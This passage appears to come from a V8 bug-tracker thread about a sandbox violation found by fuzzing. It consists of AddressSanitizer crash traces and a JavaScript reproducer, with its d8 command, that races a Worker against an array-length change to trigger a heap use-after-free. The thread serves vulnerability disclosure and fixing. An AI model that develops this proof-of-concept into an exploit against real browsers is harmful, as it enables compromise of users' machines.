    #13 0x5ca33bed62a5 in v8::internal::Heap::CreateFillerObjectAtRaw(v8::internal::WritableFreeSpace const&, v8::internal::ClearFreedMemoryMode, v8::internal::ClearRecordedSlots, v8::internal::Heap::VerifyNoSlotsRecorded) v8/src/heap/heap.cc:3402:5
    #14 0x5ca33be9f554 in v8::internal::Heap::NotifyObjectSizeChange(v8::internal::Tagged<v8::internal::HeapObject>, int, int, v8::internal::ClearRecordedSlots) v8/src/heap/heap.cc:4261:3
    #15 0x5ca33bea01ce in void v8::internal::Heap::RightTrimArray<v8::internal::FixedDoubleArray>(v8::internal::Tagged<v8::internal::FixedDoubleArray>, int, int) v8/src/heap/heap.cc:3641:5
    #16 0x5ca33c992a1c in v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastPackedDoubleElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)4>>::SetLengthImpl(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int, v8::internal::DirectHandle<v8::internal::FixedArrayBase>) v8/src/objects/elements.cc:867:7
    #17 0x5ca33c992a1c in v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastPackedDoubleElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)4>>::SetLength(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int) v8/src/objects/elements.cc:815:12
    #18 0x5ca33d028742 in v8::internal::JSArray::SetLength(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int) v8/src/objects/objects.cc:4870:40
    #19 0x5ca33b319147 in v8::internal::Accessors::ArrayLengthSetter(v8::Local<v8::Name>, v8::Local<v8::Value>, v8::PropertyCallbackInfo<v8::Boolean> const&) v8/src/builtins/accessors.cc:209:7
    #20 0x5ca33cd78c22 in v8::internal::PropertyCallbackArguments::CallAccessorSetter(v8::internal::DirectHandle<v8::internal::AccessorInfo>, v8::internal::DirectHandle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>) v8/src/api/api-arguments-inl.h:460:3
    #21 0x5ca33d00ebaf in v8::internal::Object::SetPropertyWithAccessor(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::Maybe<v8::internal::ShouldThrow>) v8/src/objects/objects.cc:1621:24
    #22 0x5ca33d019c0d in v8::internal::Object::SetPropertyInternal(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::StoreOrigin, bool*) v8/src/objects/objects.cc:2384:16
    #23 0x5ca33d01913c in v8::internal::Object::SetProperty(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::StoreOrigin, v8::Maybe<v8::internal::ShouldThrow>) v8/src/objects/objects.cc:2478:9
    #24 0x5ca33cd2dace in v8::internal::StoreIC::Store(v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver>>, v8::internal::Handle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::StoreOrigin) v8/src/ic/ic.cc:1972:5
    #25 0x5ca33cd48786 in v8::internal::__RT_impl_Runtime_StoreIC_Miss(v8::internal::Arguments<(v8::internal::ArgumentsType)0>, v8::internal::Isolate*) v8/src/ic/ic.cc:2974:3
    #26 0x5ca33cd47a58 in v8::internal::Runtime_StoreIC_Miss(int, unsigned long*, v8::internal::Isolate*) v8/src/ic/ic.cc:2946:1
    #27 0x5ca34265867c in Builtins_CEntry_Return1_ArgvOnStack_NoBuiltinExit setup-isolate-deserialize.cc
    #28 0x5ca342832853 in Builtins_SetNamedPropertyHandler setup-isolate-deserialize.cc
    #29 0x5ca342519ba2 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #30 0x5ca342514d26 in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #31 0x5ca342514a6a in Builtins_JSEntry setup-isolate-deserialize.cc
    #32 0x5ca33ba65a36 in v8::internal::GeneratedCode<unsigned long, unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**>::Call(unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**) v8/src/execution/simulator.h:212:12
    #33 0x5ca33ba65a36 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/execution.cc:442:22
    #34 0x5ca33ba69b09 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) v8/src/execution/execution.cc:542:10
    #35 0x5ca33b1febff in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) v8/src/api/api.cc:1937:7
    #36 0x5ca33a96cfca in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) v8/src/d8/d8.cc:1033:44
    #37 0x5ca33a9b3046 in v8::SourceGroup::Execute(v8::Isolate*) v8/src/d8/d8.cc:5351:10
    #38 0x5ca33a9c171c in v8::Shell::RunMainIsolate(v8::Isolate*, bool) v8/src/d8/d8.cc:6309:37
    #39 0x5ca33a9c045e in v8::Shell::RunMain(v8::Isolate*, bool) v8/src/d8/d8.cc:6217:18
    #40 0x5ca33a9c5298 in v8::Shell::Main(int, char**) v8/src/d8/d8.cc:7102:18
    #41 0x746a23b88249  (/lib/x86_64-linux-gnu/libc.so.6+0x27249) (BuildId: 79005c16293efa45b441fed45f4f29b138557e9e)

0x71ba22fe2a28 is located 0 bytes after 520-byte region [0x71ba22fe2820,0x71ba22fe2a28)
allocated by thread T0 here:
    #0 0x5ca33a8e9147 in posix_memalign (/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8+0x2636147) (BuildId: 736ced444c8e1262)
    #1 0x5ca33c2ef236 in v8::base::AlignedAlloc(unsigned long, unsigned long) v8/src/base/platform/memory.h:97:7
    #2 0x5ca33c2ef236 in heap::base::BasicSlotSet<4ul>::Allocate(unsigned long) v8/src/heap/base/basic-slot-set.h:64:24
    #3 0x5ca33c2ef236 in v8::internal::SlotSet::Allocate(unsigned long) v8/src/heap/slot-set.h:134:34
    #4 0x5ca33c2ef236 in v8::internal::MutablePageMetadata::AllocateSlotSet(v8::internal::RememberedSetType) v8/src/heap/mutable-page-metadata.cc:221:27
    #5 0x5ca33be90cd6 in void v8::internal::RememberedSet<(v8::internal::RememberedSetType)0>::Insert<(v8::internal::AccessMode)1>(v8::internal::MutablePageMetadata*, unsigned long) v8/src/heap/remembered-set.h:100:24
    #6 0x5ca33be90cd6 in v8::internal::WriteBarrier::GenerationalBarrierSlow(v8::internal::Tagged<v8::internal::HeapObject>, unsigned long, v8::internal::Tagged<v8::internal::HeapObject>) v8/src/heap/heap-write-barrier.cc:377:5
    #7 0x5ca33a9f85d4 in v8::internal::WriteBarrier::CombinedWriteBarrierInternal(v8::internal::Tagged<v8::internal::HeapObject>, v8::internal::CompressedHeapObjectSlot, v8::internal::Tagged<v8::internal::HeapObject>, v8::internal::WriteBarrierMode) v8/src/heap/heap-write-barrier-inl.h:51:7
    #8 0x5ca33cf30b04 in v8::internal::Map::SetInstanceDescriptors(v8::internal::Isolate*, v8::internal::Tagged<v8::internal::DescriptorArray>, int, v8::internal::WriteBarrierMode) v8/src/objects/map.cc:2376:3
    #9 0x5ca33cf30b04 in v8::internal::Map::InitializeDescriptors(v8::internal::Isolate*, v8::internal::Tagged<v8::internal::DescriptorArray>) v8/src/objects/map-inl.h:785:3
    #10 0x5ca33cf30b04 in v8::internal::Map::CopyReplaceDescriptors(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Map>, v8::internal::DirectHandle<v8::internal::DescriptorArray>, v8::internal::TransitionFlag, v8::internal::MaybeDirectHandle<v8::internal::Name>, char const*, v8::internal::TransitionKindFlag) v8/src/objects/map.cc:1594:15
    #11 0x5ca33cf19e8c in v8::internal::Map::CopyAddDescriptor(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Map>, v8::internal::Descriptor*, v8::internal::TransitionFlag) v8/src/objects/map.cc:2211:10
    #12 0x5ca33cf196b4 in v8::internal::Map::CopyWithField(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Map>, v8::internal::DirectHandle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::FieldType>, v8::internal::PropertyAttributes, v8::internal::PropertyConstness, v8::internal::Representation, v8::internal::TransitionFlag) v8/src/objects/map.cc:543:25
    #13 0x5ca33cf35645 in v8::internal::Map::TransitionToDataProperty(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Map>, v8::internal::DirectHandle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::internal::PropertyConstness, v8::internal::StoreOrigin) v8/src/objects/map.cc:2032:17
    #14 0x5ca33ced80ef in v8::internal::LookupIterator::PrepareTransitionToDataProperty(v8::internal::DirectHandle<v8::internal::JSReceiver>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::internal::StoreOrigin) v8/src/objects/lookup.cc:644:7
    #15 0x5ca33d021c04 in v8::internal::Object::TransitionAndWriteDataProperty(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::StoreOrigin) v8/src/objects/objects.cc:2784:7
    #16 0x5ca33d02057a in v8::internal::Object::AddDataProperty(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::StoreOrigin, v8::internal::EnforceDefineSemantics) v8/src/objects/objects.cc:2771:10
    #17 0x5ca33cde86b0 in v8::internal::JSObject::DefineOwnPropertyIgnoreAttributes(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::JSObject::AccessorInfoHandling, v8::internal::EnforceDefineSemantics, v8::internal::StoreOrigin) v8/src/objects/js-objects.cc:3795:16
    #18 0x5ca33ce15677 in T0<v8::internal::Object>::MaybeType v8::internal::JSObject::DefineOwnPropertyIgnoreAttributes<v8::internal::Object, v8::internal::DirectHandle>(v8::internal::LookupIterator*, T0<T>, v8::internal::PropertyAttributes, v8::internal::JSObject::AccessorInfoHandling, v8::internal::EnforceDefineSemantics) v8/src/objects/js-objects-inl.h:652:3
    #19 0x5ca33ce15677 in v8::internal::JSObject::SetOwnPropertyIgnoreAttributes(v8::internal::DirectHandle<v8::internal::JSObject>, v8::internal::DirectHandle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::PropertyAttributes) v8/src/objects/js-objects.cc:3808:10
    #20 0x5ca33d76c156 in v8::internal::(anonymous namespace)::CreateObjectLiteral(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::ObjectBoilerplateDescription>, int, v8::internal::AllocationType) v8/src/runtime/runtime-literals.cc:431:7
    #21 0x5ca33d7676b7 in v8::internal::(anonymous namespace)::ObjectLiteralHelper::Create(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, int, v8::internal::AllocationType) v8/src/runtime/runtime-literals.cc:350:12
    #22 0x5ca33d7676b7 in v8::internal::MaybeDirectHandle<v8::internal::JSObject> v8::internal::(anonymous namespace)::CreateLiteralWithoutAllocationSite<v8::internal::(anonymous namespace)::ObjectLiteralHelper>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, int) v8/src/runtime/runtime-literals.cc:504:30
    #23 0x5ca33d7621d3 in v8::internal::MaybeDirectHandle<v8::internal::JSObject> v8::internal::(anonymous namespace)::CreateLiteral<v8::internal::(anonymous namespace)::ObjectLiteralHelper>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, int, v8::internal::Handle<v8::internal::HeapObject>, int) v8/src/runtime/runtime-literals.cc
    #24 0x5ca33d7621d3 in v8::internal::__RT_impl_Runtime_CreateObjectLiteral(v8::internal::Arguments<(v8::internal::ArgumentsType)0>, v8::internal::Isolate*) v8/src/runtime/runtime-literals.cc:577:3
    #25 0x5ca33d761658 in v8::internal::Runtime_CreateObjectLiteral(int, unsigned long*, v8::internal::Isolate*) v8/src/runtime/runtime-literals.cc:569:1
    #26 0x5ca34265867c in Builtins_CEntry_Return1_ArgvOnStack_NoBuiltinExit setup-isolate-deserialize.cc
    #27 0x5ca3a24c0bf2  (<unknown module>)
    #28 0x5ca342514d26 in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #29 0x5ca342514a6a in Builtins_JSEntry setup-isolate-deserialize.cc
    #30 0x5ca33ba65a36 in v8::internal::GeneratedCode<unsigned long, unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**>::Call(unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**) v8/src/execution/simulator.h:212:12
    #31 0x5ca33ba65a36 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/execution.cc:442:22
    #32 0x5ca33ba69b09 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) v8/src/execution/execution.cc:542:10
    #33 0x5ca33b1febff in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) v8/src/api/api.cc:1937:7
    #34 0x5ca33a96cfca in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) v8/src/d8/d8.cc:1033:44
    #35 0x5ca33a9b3046 in v8::SourceGroup::Execute(v8::Isolate*) v8/src/d8/d8.cc:5351:10
    #36 0x5ca33a9c171c in v8::Shell::RunMainIsolate(v8::Isolate*, bool) v8/src/d8/d8.cc:6309:37
    #37 0x5ca33a9c045e in v8::Shell::RunMain(v8::Isolate*, bool) v8/src/d8/d8.cc:6217:18
    #38 0x5ca33a9c5298 in v8::Shell::Main(int, char**) v8/src/d8/d8.cc:7102:18
    #39 0x746a23b88249  (/lib/x86_64-linux-gnu/libc.so.6+0x27249) (BuildId: 79005c16293efa45b441fed45f4f29b138557e9e)

SUMMARY: AddressSanitizer: heap-buffer-overflow third_party/libc++/src/include/__atomic/support/c11.h:75:10 in long std::__Cr::__cxx_atomic_load<long>(std::__Cr::__cxx_atomic_base_impl<long> const volatile*, std::__Cr::memory_order)
Shadow bytes around the buggy address:
  0x71ba22fe2780: fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa
  0x71ba22fe2800: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00
  0x71ba22fe2880: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x71ba22fe2900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x71ba22fe2980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x71ba22fe2a00: 00 00 00 00 00[fa]fa fa fa fa fa fa fa fa fa fa
  0x71ba22fe2a80: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
  0x71ba22fe2b00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x71ba22fe2b80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x71ba22fe2c00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x71ba22fe2c80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==75174==ABORTING

## V8 sandbox violation detected!

```

I was not able to reproduce the UAF yet.

### ml...@chromium.org (2025-07-10)

I think there also may be an OOB with a corrupted end index (== corrupted length).

### da...@hirsch.cx (2025-07-10)

The following program reproduces the UAF on V8 version 13.9.100 reliably, at least on my machine:

```
function f13(a14) {
    const v27 = new DataView(new Sandbox.MemoryView(0, 4294967296));
    v27.setInt16(a14, 0xafc5, true);
    print('1')
}

const v23 = [6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,609266,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824,60926,6,-6656,-6,-451824325,206103776,1842192693,268435439,1073741824];
new Worker(f13, { type: "function", arguments: [Sandbox.getAddressOf(v23) + 30] });
print('2')
for (let i = 0; i<2**19;) {
    i++;
}
v23.length &&= 26927;

```

Omer, could you test if this reproduces for you as well? From my experiments, I might help to tweak the requested length and/or the number of iterations but you have probably already tried that.
I used the following command:

```
ASAN_OPTIONS="redzone=16:max_redzone=32:thread_local_quarantine_size_kb=1:quarantine_size_mb=4096" ./v8-13.9.100-49744da4e01c596a56c34c6d1fcbd0332f877ea8/fuzzbuild-with-symbols/d8 --sandbox-testing --jit-fuzzing --single-threaded deterministic_uaf.js

```

I understand that `--jit-fuzzing` is not covered by the VRP but for now it seems to make getting the timing right easier.

Still not able to reproduce on V8 14.0.170 (hitting the aforementioned null pointer dereference) though, so either your CL killed the UAF already or at least made winning the race more difficult.

Stacktrace should be the same, just for completeness:

```
[COV] no shared memory bitmap available, skipping
[COV] edge counters initialized. Shared memory: (null) with 1595718 edges
Sandbox testing mode is enabled. Only sandbox violations will be reported, all other crashes will be ignored.
2
1
# Ignoring debug check failure in ../../v8/src/heap/heap.cc, line 3594: new_capacity < old_capacity (26927 vs. -673021702)
# Ignoring debug check failure in ../../v8/src/heap/heap.cc, line 4222: new_size <= old_size (215424 vs. -1089206312)
# Ignoring debug check failure in ../../v8/src/heap/heap.cc, line 3306: size > 2 * kTaggedSize (-1089421736 vs. 8)
# Ignoring debug check failure in ../../v8/src/objects/free-space-inl.h, line 30: size > 2 * kTaggedSize (-1089421736 vs. 8)
=================================================================
==266343==ERROR: AddressSanitizer: heap-use-after-free on address 0x7066349e7828 at pc 0x5975a01bc4e8 bp 0x7ffcf5dd7680 sp 0x7ffcf5dd7678
READ of size 8 at 0x7066349e7828 thread T0
    #0 0x5975a01bc4e7 in v8::internal::BaseSpace::heap() const v8/src/heap/base-space.h:28:5
    #1 0x5975a01bc4e7 in v8::internal::(anonymous namespace)::VerifyNoNeedToClearSlots(unsigned long, unsigned long) v8/src/heap/heap.cc:3330:10
    #2 0x5975a01bc4e7 in v8::internal::Heap::CreateFillerObjectAtRaw(v8::internal::WritableFreeSpace const&, v8::internal::ClearFreedMemoryMode, v8::internal::ClearRecordedSlots, v8::internal::Heap::VerifyNoSlotsRecorded) v8/src/heap/heap.cc:3379:5
    #3 0x5975a0184fc4 in v8::internal::Heap::NotifyObjectSizeChange(v8::internal::Tagged<v8::internal::HeapObject>, int, int, v8::internal::ClearRecordedSlots) v8/src/heap/heap.cc:4238:3
    #4 0x5975a0185c3e in void v8::internal::Heap::RightTrimArray<v8::internal::FixedDoubleArray>(v8::internal::Tagged<v8::internal::FixedDoubleArray>, int, int) v8/src/heap/heap.cc:3618:5
    #5 0x5975a0c747d8 in v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastPackedDoubleElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)4>>::SetLengthImpl(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int, v8::internal::DirectHandle<v8::internal::FixedArrayBase>) v8/src/objects/elements.cc:869:7
    #6 0x5975a0c747d8 in v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastPackedDoubleElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)4>>::SetLength(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int) v8/src/objects/elements.cc:817:12
    #7 0x5975a13002c2 in v8::internal::JSArray::SetLength(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int) v8/src/objects/objects.cc:4875:40
    #8 0x59759f60f287 in v8::internal::Accessors::ArrayLengthSetter(v8::Local<v8::Name>, v8::Local<v8::Value>, v8::PropertyCallbackInfo<v8::Boolean> const&) v8/src/builtins/accessors.cc:209:7
    #9 0x5975a1052cbc in v8::internal::PropertyCallbackArguments::CallAccessorSetter(v8::internal::DirectHandle<v8::internal::AccessorInfo>, v8::internal::DirectHandle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>) v8/src/api/api-arguments-inl.h:460:3
    #10 0x5975a12e5f2c in v8::internal::Object::SetPropertyWithAccessor(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::Maybe<v8::internal::ShouldThrow>) v8/src/objects/objects.cc:1620:24
    #11 0x5975a12f13a7 in v8::internal::Object::SetPropertyInternal(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::StoreOrigin, bool*) v8/src/objects/objects.cc:2371:16
    #12 0x5975a12f08dc in v8::internal::Object::SetProperty(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::StoreOrigin, v8::Maybe<v8::internal::ShouldThrow>) v8/src/objects/objects.cc:2466:9
    #13 0x5975a100760a in v8::internal::StoreIC::Store(v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver>>, v8::internal::Handle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::StoreOrigin) v8/src/ic/ic.cc:1975:5
    #14 0x5975a10227b8 in v8::internal::__RT_impl_Runtime_StoreIC_Miss(v8::internal::Arguments<(v8::internal::ArgumentsType)0>, v8::internal::Isolate*) v8/src/ic/ic.cc:2968:3
    #15 0x5975a10216a8 in v8::internal::Runtime_StoreIC_Miss(int, unsigned long*, v8::internal::Isolate*) v8/src/ic/ic.cc:2940:1
    #16 0x5975a67f2abc in Builtins_CEntry_Return1_ArgvOnStack_NoBuiltinExit setup-isolate-deserialize.cc
    #17 0x5975a69c6b13 in Builtins_SetNamedPropertyHandler setup-isolate-deserialize.cc
    #18 0x5975a66b8862 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #19 0x5975a66b3ce6 in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #20 0x5975a66b3a2a in Builtins_JSEntry setup-isolate-deserialize.cc
    #21 0x59759fd560c2 in v8::internal::GeneratedCode<unsigned long, unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**>::Call(unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**) v8/src/execution/simulator.h:212:12
    #22 0x59759fd560c2 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/execution.cc:442:22
    #23 0x59759fd5a229 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) v8/src/execution/execution.cc:542:10
    #24 0x59759f4f5578 in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) v8/src/api/api.cc:1965:7
    #25 0x59759eb6fb61 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) v8/src/d8/d8.cc:1028:44
    #26 0x59759eba9545 in v8::SourceGroup::Execute(v8::Isolate*) v8/src/d8/d8.cc:5077:10
    #27 0x59759ebb6631 in v8::Shell::RunMainIsolate(v8::Isolate*, bool) v8/src/d8/d8.cc:6029:37
    #28 0x59759ebb563e in v8::Shell::RunMain(v8::Isolate*, bool) v8/src/d8/d8.cc:5937:18
    #29 0x59759ebb9ca8 in v8::Shell::Main(int, char**) v8/src/d8/d8.cc:6803:18
    #30 0x737635534249  (/lib/x86_64-linux-gnu/libc.so.6+0x27249) (BuildId: 79005c16293efa45b441fed45f4f29b138557e9e)

0x7066349e7828 is located 8 bytes inside of 200-byte region [0x7066349e7820,0x7066349e78e8)
freed by thread T1 (WorkerThread) here:
    #0 0x59759eaf1396 in free /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cpp:51:3
    #1 0x5975a01d6201 in std::__Cr::default_delete<v8::internal::Space>::operator()(v8::internal::Space*) const third_party/libc++/src/include/__memory/unique_ptr.h:77:5
    #2 0x5975a01d6201 in std::__Cr::unique_ptr<v8::internal::Space, std::__Cr::default_delete<v8::internal::Space>>::reset(v8::internal::Space*) third_party/libc++/src/include/__memory/unique_ptr.h:290:7
    #3 0x5975a01d6201 in v8::internal::Heap::TearDown() v8/src/heap/heap.cc:6368:15
    #4 0x59759fde203a in v8::internal::Isolate::Deinit() v8/src/execution/isolate.cc:4628:9
    #5 0x59759fde0a91 in v8::internal::Isolate::Deinitialize(v8::internal::Isolate*) v8/src/execution/isolate.cc:4205:12
    #6 0x59759fde08bc in v8::internal::Isolate::Delete(v8::internal::Isolate*) v8/src/execution/isolate.cc:4186:3
    #7 0x59759ebadba6 in v8::Worker::ExecuteInThread() v8/src/d8/d8.cc:5522:13
    #8 0x59759ebac77c in v8::Worker::WorkerThread::Run() v8/src/d8/d8.cc:5226:11
    #9 0x59759f4b1952 in v8::base::Thread::NotifyStartedAndRun() v8/src/base/platform/platform.h:627:5
    #10 0x59759f4b1952 in v8::base::ThreadEntry(void*) v8/src/base/platform/platform-posix.cc:1229:11
    #11 0x59759eaeef86 in asan_thread_start(void*) /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors.cpp:239:28

previously allocated by thread T1 (WorkerThread) here:
    #0 0x59759eaf1634 in malloc /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cpp:67:3
    #1 0x5975a1c261ed in v8::base::Malloc(unsigned long) v8/src/base/platform/memory.h:44:10
    #2 0x5975a1c261ed in v8::internal::AllocWithRetry(unsigned long, void* (*)(unsigned long)) v8/src/utils/allocation.cc:126:14
    #3 0x5975a1c261ed in v8::internal::Malloced::operator new(unsigned long) v8/src/utils/allocation.cc:97:18
    #4 0x5975a01d06c8 in std::__Cr::unique_ptr<v8::internal::OldSpace, std::__Cr::default_delete<v8::internal::OldSpace>> std::__Cr::make_unique<v8::internal::OldSpace, v8::internal::Heap*, 0>(v8::internal::Heap*&&) third_party/libc++/src/include/__memory/unique_ptr.h:759:26
    #5 0x5975a01d06c8 in v8::internal::Heap::SetUpSpaces(v8::internal::LinearAllocationArea&, v8::internal::LinearAllocationArea&) v8/src/heap/heap.cc:5942:25
    #6 0x59759fdf4643 in v8::internal::Isolate::Init(v8::internal::SnapshotData*, v8::internal::SnapshotData*, v8::internal::SnapshotData*, bool) v8/src/execution/isolate.cc:5691:9
    #7 0x59759fdf9a04 in v8::internal::Isolate::InitWithSnapshot(v8::internal::SnapshotData*, v8::internal::SnapshotData*, v8::internal::SnapshotData*, bool) v8/src/execution/isolate.cc:5325:10
